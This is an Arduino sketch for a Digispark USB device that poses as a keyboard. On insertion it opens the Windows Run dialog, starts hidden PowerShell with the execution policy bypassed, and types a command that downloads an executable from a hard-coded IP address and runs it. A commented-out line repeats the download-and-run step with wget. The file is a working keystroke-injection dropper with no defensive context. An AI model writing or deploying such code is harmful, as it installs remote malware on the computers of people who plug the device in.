#include "DigiKeyboard.h"
 
void setup() {
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A  or Pro
}

//uncomment to run live
  char mode[] = "powershell -nop -win h -noni -exec bypass";
  //char mode[] = "powershell";
  char separator[] = "exit";
//end live
 
void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(mode);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //DigiKeyboard.print("wget http://137.184.197.191/indmeuarquivo.exe -OutFile $env:userprofile\\PAYLOAD.exe; start-process $env:userprofile\\PAYLOAD.exe; stop-process -Id $PID");
  DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'http://137.184.197.191/qmckdsoqwdnscnaklsccznaksjdn/indmeuarquivo.exe'; $file = 'indmeuarquivo.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  DigiKeyboard.delay(500);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(2500);
   
  blinkLed();
}

void blinkLed()
{
  while (true) {
    digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
    digitalWrite(1, HIGH);
    delay(250);               // wait for 1/4 of a second
    digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
    digitalWrite(1, LOW);
    delay(250);
  }
}
